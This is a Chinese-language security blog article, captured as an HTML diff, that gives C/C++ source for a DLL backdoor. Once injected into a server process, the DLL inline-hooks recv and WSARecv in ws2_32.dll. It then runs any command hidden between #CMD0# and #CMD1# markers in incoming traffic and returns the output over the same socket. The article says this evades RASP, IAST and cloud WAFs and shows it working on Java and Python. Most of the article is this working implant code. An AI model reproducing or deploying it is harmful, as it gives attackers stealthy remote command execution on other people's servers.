@@ -1,0 +1,166 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<blockquote>
+<p>标题中的 “通用” 指跨语言，本文的实现是基于 Windows 的，需要 Linux 的可以参考本文的思路，实现起来并没有太大区别。</p>
+<p>Author: <a href="https://jayl1n.github.io" target="_blank">Jayl1n@Syclover</a></p>
+</blockquote>
+<h1 data-content="1" id="03a1a1ae80e8dd05d36985b938d85e0c">原理</h1>
+<p>Windows 上程序涉及网络 socket 操作，一般都会用到 winsock2 的库，程序会动态链接 <code>ws2_32.dll</code> ，JVM，Python，Zend 等解释器都不例外。</p>
+<p>winsock2 里 socket 操作相关的函数 <code>recv</code> <code>send</code> <code>closesocket</code> 会编程的应该都不陌生。<strong>hook 掉 <code>recv</code> 函数就可以在程序处理接受到网络数据前，进入我们的处理逻辑早一步收到数据。</strong></p>
+<p>由于实现是 native 的，所以在成功 hook 的情况下能绕过现代的 RASP、IAST、云WAF 等现代流行的防护技术。</p>
+<h1 data-content="1" id="67ec2fd06916f004466e68da5a611e02">Inline Hook</h1>
+<p>Inline Hook 是在程序运行时直接修改指令，插入跳转指令（jmp/call/retn）来控制程序执行流的一种技术。相比别的 Hook 技术，Inline Hook 优点是能跨平台，稳定，本文是以此技术实现的。</p>
+<h1 data-content="1" id="69d66f7adbc838bc1c489c4da535ded1">实现</h1>
+<p>具体实现分为两个部分，一个是hook函数的 DLL(只讲这个)；另一个是向进程注入 DLL 的辅助工具(github上有很多)。</p>
+<h2 data-content="1" id="2c125a77d60ac900e797d558ce120694">InstallHook</h2>
+<p>安装钩子</p>
+<div class="highlight"><pre><span></span><span class="cp">#define START_BLOCK "#CMD0#"</span>
+<span class="cp">#define END_BLOCK "#CMD1#"</span>
+
+<span class="n">DWORD</span> <span class="n">dwInstSize</span> <span class="o">=</span> <span class="mi">12</span><span class="p">;</span>
+<span class="n">BYTE</span> <span class="n">RecvEntryPointInst</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x00</span> <span class="p">};</span>
+<span class="n">BYTE</span> <span class="n">RecvEntryPointInstHook</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xB8</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0xE0</span> <span class="p">};</span>
+<span class="n">BYTE</span> <span class="n">WSARecvEntryPointInst</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x00</span> <span class="p">};</span>
+<span class="n">BYTE</span> <span class="n">WSARecvEntryPointInstHook</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xB8</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0xE0</span> <span class="p">};</span>
+
+<span class="k">typedef</span> <span class="nf">int</span> <span class="p">(</span> <span class="o">*</span><span class="n">PFNRecv</span> <span class="p">)(</span> <span class="n">SOCKET</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="kt">int</span> <span class="p">);</span>
+<span class="k">typedef</span> <span class="nf">int</span> <span class="p">(</span> <span class="o">*</span><span class="n">PFNSend</span> <span class="p">)(</span> <span class="n">SOCKET</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="kt">int</span> <span class="p">);</span>
+
+<span class="k">typedef</span> <span class="nf">int</span> <span class="p">(</span> <span class="o">*</span><span class="n">PFNWSARecv</span> <span class="p">)</span> <span class="p">(</span> <span class="n">SOCKET</span><span class="p">,</span> <span class="n">LPWSABUF</span><span class="p">,</span> <span class="n">DWORD</span><span class="p">,</span> <span class="n">LPDWORD</span><span class="p">,</span> <span class="n">LPDWORD</span><span class="p">,</span> <span class="n">LPWSAOVERLAPPED</span><span class="p">,</span> <span class="n">LPWSAOVERLAPPED_COMPLETION_ROUTINE</span> <span class="p">);</span>
+<span class="k">typedef</span> <span class="nf">int</span> <span class="p">(</span> <span class="o">*</span><span class="n">PFNWSASend</span> <span class="p">)</span> <span class="p">(</span> <span class="n">SOCKET</span><span class="p">,</span> <span class="n">LPWSABUF</span><span class="p">,</span> <span class="n">DWORD</span><span class="p">,</span> <span class="n">LPDWORD</span><span class="p">,</span> <span class="n">LPDWORD</span><span class="p">,</span> <span class="n">LPWSAOVERLAPPED</span><span class="p">,</span> <span class="n">LPWSAOVERLAPPED_COMPLETION_ROUTINE</span> <span class="p">);</span>
+
+<span class="kt">void</span> <span class="nf">InstallHook</span><span class="p">(</span><span class="n">LPCWSTR</span> <span class="n">lpModule</span><span class="p">,</span> <span class="n">LPCSTR</span> <span class="n">lpFuncName</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpFunction</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">DWORD_PTR</span> <span class="n">FuncAddress</span> <span class="o">=</span> <span class="p">(</span><span class="n">UINT64</span><span class="p">)</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandleW</span><span class="p">(</span><span class="n">lpModule</span><span class="p">),</span> <span class="n">lpFuncName</span><span class="p">);</span>
+    <span class="n">DWORD</span> <span class="n">OldProtect</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">VirtualProtect</span><span class="p">((</span><span class="n">LPVOID</span><span class="p">)</span> <span class="n">FuncAddress</span><span class="p">,</span> <span class="n">dwInstSize</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">OldProtect</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">lpFuncName</span><span class="p">,</span> <span class="s">"recv"</span><span class="p">))</span> <span class="p">{</span>
+            <span class="n">memcpy</span><span class="p">(</span><span class="n">RecvEntryPointInst</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span> <span class="n">FuncAddress</span><span class="p">,</span> <span class="n">dwInstSize</span><span class="p">);</span>
+            <span class="o">*</span><span class="p">(</span><span class="n">PINT64</span><span class="p">)</span> <span class="p">(</span> <span class="n">RecvEntryPointInstHook</span> <span class="o">+</span> <span class="mi">2</span> <span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="n">UINT64</span><span class="p">)</span> <span class="n">lpFunction</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">lpFuncName</span><span class="p">,</span> <span class="s">"WSARecv"</span><span class="p">))</span> <span class="p">{</span>
+            <span class="n">memcpy</span><span class="p">(</span><span class="n">WSARecvEntryPointInst</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span> <span class="n">FuncAddress</span><span class="p">,</span> <span class="n">dwInstSize</span><span class="p">);</span>
+            <span class="o">*</span><span class="p">(</span><span class="n">PINT64</span><span class="p">)</span> <span class="p">(</span> <span class="n">WSARecvEntryPointInstHook</span> <span class="o">+</span> <span class="mi">2</span> <span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="n">UINT64</span><span class="p">)</span> <span class="n">lpFunction</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">lpFuncName</span><span class="p">,</span> <span class="s">"recv"</span><span class="p">))</span> 
+        <span class="n">memcpy</span><span class="p">((</span><span class="n">LPVOID</span><span class="p">)</span> <span class="n">FuncAddress</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">RecvEntryPointInstHook</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">RecvEntryPointInstHook</span><span class="p">));</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">lpFuncName</span><span class="p">,</span><span class="s">"WSARecv"</span><span class="p">))</span>
+        <span class="n">memcpy</span><span class="p">((</span><span class="n">LPVOID</span><span class="p">)</span> <span class="n">FuncAddress</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">WSARecvEntryPointInstHook</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">WSARecvEntryPointInstHook</span><span class="p">));</span>
+
+    <span class="n">VirtualProtect</span><span class="p">((</span><span class="n">LPVOID</span><span class="p">)</span> <span class="n">FuncAddress</span><span class="p">,</span> <span class="n">dwInstSize</span><span class="p">,</span> <span class="n">OldProtect</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">OldProtect</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+<h2 data-content="1" id="20159490a46ecb56c4df843aab32f8c6">UninstallHook</h2>
+<p>卸载钩子</p>
+<div class="highlight"><pre><span></span><span class="kt">void</span> <span class="nf">UninstallHook</span><span class="p">(</span><span class="n">LPCWSTR</span> <span class="n">lpModule</span><span class="p">,</span> <span class="n">LPCSTR</span> <span class="n">lpFuncName</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">UINT64</span> <span class="n">FuncAddress</span> <span class="o">=</span> <span class="p">(</span><span class="n">UINT64</span><span class="p">)</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandleW</span><span class="p">(</span><span class="n">lpModule</span><span class="p">),</span> <span class="n">lpFuncName</span><span class="p">);</span>
+    <span class="n">DWORD</span> <span class="n">OldProtect</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">VirtualProtect</span><span class="p">((</span><span class="n">LPVOID</span><span class="p">)</span> <span class="n">FuncAddress</span><span class="p">,</span> <span class="n">dwInstSize</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">OldProtect</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">lpFuncName</span><span class="p">,</span> <span class="s">"recv"</span><span class="p">))</span> 
+            <span class="n">memcpy</span><span class="p">((</span><span class="n">LPVOID</span><span class="p">)</span> <span class="n">FuncAddress</span><span class="p">,</span> <span class="n">RecvEntryPointInst</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">RecvEntryPointInst</span><span class="p">));</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">lpFuncName</span><span class="p">,</span><span class="s">"WSARecv"</span><span class="p">))</span>
+            <span class="n">memcpy</span><span class="p">((</span><span class="n">LPVOID</span><span class="p">)</span> <span class="n">FuncAddress</span><span class="p">,</span> <span class="n">WSARecvEntryPointInst</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">WSARecvEntryPointInst</span><span class="p">));</span>
+    <span class="p">}</span>
+    <span class="n">VirtualProtect</span><span class="p">((</span><span class="n">LPVOID</span><span class="p">)</span> <span class="n">FuncAddress</span><span class="p">,</span> <span class="n">dwInstSize</span><span class="p">,</span> <span class="n">OldProtect</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">OldProtect</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+<h2 data-content="1" id="72a8efa91c7f1bf0db8a1d6ad6659b42">HookRecv</h2>
+<p>hook recv 的函数，程序在执行 recv 时，会先进入这个函数。</p>
+<p>在这个函数里，调用原来的 recv 获取数据，判断是否有<code>START_BLOCK</code>、<code>END_BLOCK</code>块，有的话就取出块之间的命令，执行。</p>
+<div class="highlight"><pre><span></span><span class="kt">int</span> <span class="n">WINAPI</span> <span class="nf">HookRecv</span><span class="p">(</span><span class="n">SOCKET</span> <span class="n">s</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">buf</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">UninstallHook</span><span class="p">(</span><span class="sa">L</span><span class="s">"ws2_32.dll"</span><span class="p">,</span> <span class="s">"recv"</span><span class="p">);</span>
+
+    <span class="n">PFNRecv</span> <span class="n">pfnRecv</span> <span class="o">=</span> <span class="p">(</span><span class="n">PFNRecv</span><span class="p">)</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandleW</span><span class="p">(</span><span class="sa">L</span><span class="s">"ws2_32.dll"</span><span class="p">),</span> <span class="s">"recv"</span><span class="p">);</span>
+    <span class="n">PFNSend</span> <span class="n">pfnSend</span> <span class="o">=</span> <span class="p">(</span><span class="n">PFNSend</span><span class="p">)</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandleW</span><span class="p">(</span><span class="sa">L</span><span class="s">"ws2_32.dll"</span><span class="p">),</span> <span class="s">"send"</span><span class="p">);</span>
+    <span class="n">PFNClosesocket</span> <span class="n">pfnClosesocket</span> <span class="o">=</span> <span class="p">(</span><span class="n">PFNClosesocket</span><span class="p">)</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandleW</span><span class="p">(</span><span class="sa">L</span><span class="s">"ws2_32.dll"</span><span class="p">),</span> <span class="s">"closesocket"</span><span class="p">);</span>
+
+    <span class="kt">int</span> <span class="n">rc</span> <span class="o">=</span> <span class="n">pfnRecv</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
+
+    <span class="kt">char</span><span class="o">*</span> <span class="n">startBlock</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">START_BLOCK</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">startBlock</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kt">char</span><span class="o">*</span> <span class="n">endBlock</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">startBlock</span><span class="p">,</span> <span class="n">END_BLOCK</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">endBlock</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">start_block</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="p">(</span><span class="n">startBlock</span><span class="p">);</span>
+            <span class="kt">int</span> <span class="n">endOffset</span> <span class="o">=</span> <span class="n">start_block</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="n">END_BLOCK</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">START_BLOCK</span><span class="p">));</span>
+            <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">cmd</span> <span class="o">=</span> <span class="n">start_block</span><span class="p">.</span><span class="n">substr</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">START_BLOCK</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">start_block</span><span class="p">.</span><span class="n">size</span><span class="p">()</span> <span class="o">-</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">START_BLOCK</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span> <span class="n">start_block</span><span class="p">.</span><span class="n">size</span><span class="p">()</span> <span class="o">-</span> <span class="n">endOffset</span> <span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+
+            <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">output</span> <span class="o">=</span> <span class="n">WSTR2STR</span><span class="p">(</span><span class="n">ExecuteCmd</span><span class="p">(</span><span class="n">cmd</span><span class="p">));</span>
+
+            <span class="n">pfnSend</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span> <span class="n">output</span><span class="p">.</span><span class="n">c_str</span><span class="p">(),</span> <span class="n">output</span><span class="p">.</span><span class="n">size</span><span class="p">(),</span> <span class="mi">0</span><span class="p">);</span>
+         <span class="n">pfnClosesocket</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="n">InstallHook</span><span class="p">(</span><span class="sa">L</span><span class="s">"ws2_32.dll"</span><span class="p">,</span> <span class="s">"recv"</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span> <span class="n">HookRecv</span><span class="p">);</span>
+
+    <span class="k">return</span>  <span class="n">rc</span><span class="p">;</span>
+<span class="p">}</span>
+
+
+<span class="kt">int</span> <span class="n">WINAPI</span> <span class="nf">HookWSARecv</span><span class="p">(</span><span class="n">SOCKET</span> <span class="n">s</span><span class="p">,</span> <span class="n">LPWSABUF</span> <span class="n">lpBuffer</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">dwBufferCount</span><span class="p">,</span> <span class="n">LPDWORD</span> <span class="n">lpNumberOfBytesRecvd</span><span class="p">,</span> <span class="n">LPDWORD</span> <span class="n">lpFlags</span><span class="p">,</span> <span class="n">LPWSAOVERLAPPED</span> <span class="n">lpOverlapped</span><span class="p">,</span> <span class="n">LPWSAOVERLAPPED_COMPLETION_ROUTINE</span> <span class="n">lpCompletionRoutine</span><span class="p">)</span> <span class="p">{</span>
+
+    <span class="n">UninstallHook</span><span class="p">(</span><span class="sa">L</span><span class="s">"ws2_32.dll"</span><span class="p">,</span> <span class="s">"WSARecv"</span><span class="p">);</span>
+
+    <span class="n">PFNWSARecv</span> <span class="n">pfnWSARecv</span> <span class="o">=</span> <span class="p">(</span><span class="n">PFNWSARecv</span><span class="p">)</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandleW</span><span class="p">(</span><span class="sa">L</span><span class="s">"ws2_32.dll"</span><span class="p">),</span> <span class="s">"WSARecv"</span><span class="p">);</span>
+    <span class="n">PFNWSASend</span> <span class="n">pfnWSASend</span> <span class="o">=</span> <span class="p">(</span><span class="n">PFNWSASend</span><span class="p">)</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandleW</span><span class="p">(</span><span class="sa">L</span><span class="s">"ws2_32.dll"</span><span class="p">),</span> <span class="s">"WSASend"</span><span class="p">);</span>
+    <span class="n">PFNClosesocket</span> <span class="n">pfnClosesocket</span> <span class="o">=</span> <span class="p">(</span><span class="n">PFNClosesocket</span><span class="p">)</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandleW</span><span class="p">(</span><span class="sa">L</span><span class="s">"ws2_32.dll"</span><span class="p">),</span> <span class="s">"closesocket"</span><span class="p">);</span>
+
+    <span class="kt">int</span> <span class="n">rc</span> <span class="o">=</span> <span class="n">pfnWSARecv</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">lpBuffer</span><span class="p">,</span> <span class="n">dwBufferCount</span><span class="p">,</span> <span class="n">lpNumberOfBytesRecvd</span><span class="p">,</span> <span class="n">lpFlags</span><span class="p">,</span> <span class="n">lpOverlapped</span><span class="p">,</span> <span class="n">lpCompletionRoutine</span><span class="p">);</span>
+
+    <span class="kt">char</span><span class="o">*</span> <span class="n">startBlock</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">lpBuffer</span><span class="o">-&gt;</span><span class="n">buf</span><span class="p">,</span> <span class="n">START_BLOCK</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">startBlock</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kt">char</span><span class="o">*</span> <span class="n">endBlock</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">startBlock</span><span class="p">,</span> <span class="n">END_BLOCK</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">endBlock</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">start_block</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="p">(</span><span class="n">startBlock</span><span class="p">);</span>
+            <span class="kt">int</span> <span class="n">endOffset</span> <span class="o">=</span> <span class="n">start_block</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="n">END_BLOCK</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">START_BLOCK</span><span class="p">));</span>
+            <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">cmd</span> <span class="o">=</span> <span class="n">start_block</span><span class="p">.</span><span class="n">substr</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">START_BLOCK</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">start_block</span><span class="p">.</span><span class="n">size</span><span class="p">()</span> <span class="o">-</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">START_BLOCK</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span> <span class="n">start_block</span><span class="p">.</span><span class="n">size</span><span class="p">()</span> <span class="o">-</span> <span class="n">endOffset</span> <span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+
+            <span class="n">WSABUF</span> <span class="n">outBuf</span><span class="p">;</span>
+            <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">output</span> <span class="o">=</span> <span class="n">WSTR2STR</span><span class="p">(</span><span class="n">ExecuteCmd</span><span class="p">(</span><span class="n">cmd</span><span class="p">));</span>
+            <span class="n">outBuf</span><span class="p">.</span><span class="n">buf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span> <span class="n">output</span><span class="p">.</span><span class="n">c_str</span><span class="p">();</span>
+            <span class="n">outBuf</span><span class="p">.</span><span class="n">len</span> <span class="o">=</span> <span class="n">output</span><span class="p">.</span><span class="n">size</span><span class="p">();</span>
+
+            <span class="n">pfnWSASend</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">outBuf</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">lpNumberOfBytesRecvd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+         <span class="n">pfnClosesocket</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="n">InstallHook</span><span class="p">(</span><span class="sa">L</span><span class="s">"ws2_32.dll"</span><span class="p">,</span> <span class="s">"WSARecv"</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span> <span class="n">HookWSARecv</span><span class="p">);</span>
+
+    <span class="k">return</span>  <span class="n">rc</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<blockquote>
+<p>这里还 hook 了 <code>WSARecv</code> ，是因为我在 Tomcat 上测试遇到个问题  hook <code>recv</code> 后收到的数据是乱码，长度也对不上。 后来想到 Tomcat 现在默认是 NIO 处理，JVM 的用的 API 可能不一样，翻看了一下源码，发现 Windows 上 NIO 相关的 socket 操作函数实际用的是 <code>WSARecv</code>、<code>WSASend</code> 等带 <code>WSA</code> 前缀的，加了 hook 点之后能正常读到数据了。</p>
+</blockquote>
+<h2 data-content="1" id="f786addabf9cbef7c9c481fc5fabae3c">DllMain</h2>
+<p>DLL 入口，调用安装钩子</p>
+<div class="highlight"><pre><span></span><span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">HINSTANCE</span> <span class="n">hinstDLL</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">fdwReason</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">switch</span><span class="p">(</span><span class="n">fdwReason</span><span class="p">)</span>
+    <span class="p">{</span>
+    <span class="k">case</span> <span class="nl">DLL_PROCESS_ATTACH</span><span class="p">:</span>
+        <span class="n">InstallHook</span><span class="p">(</span><span class="sa">L</span><span class="s">"ws2_32.dll"</span><span class="p">,</span> <span class="s">"recv"</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span> <span class="n">HookRecv</span><span class="p">);</span>
+        <span class="n">InstallHook</span><span class="p">(</span><span class="sa">L</span><span class="s">"ws2_32.dll"</span><span class="p">,</span> <span class="s">"WSARecv"</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span> <span class="n">HookWSARecv</span><span class="p">);</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="k">case</span> <span class="nl">DLL_THREAD_ATTACH</span><span class="p">:</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="k">case</span> <span class="nl">DLL_THREAD_DETACH</span><span class="p">:</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="k">case</span> <span class="nl">DLL_PROCESS_DETACH</span><span class="p">:</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<h1 data-content="1" id="60b4c567e32036bad1f3e01995388eab">效果</h1>
+<h2 data-content="1" id="1c7724520a3017afc74d309f6cbf8a32">Java</h2>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210623150917-ecdedc04-d3f1-1.gif"/></p>
+<h2 data-content="1" id="61226de8a39c6df4b9edd329f3b028c7">Python</h2>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210623150933-f65e4f44-d3f1-1.gif"/></p>
+</div>
+</div>
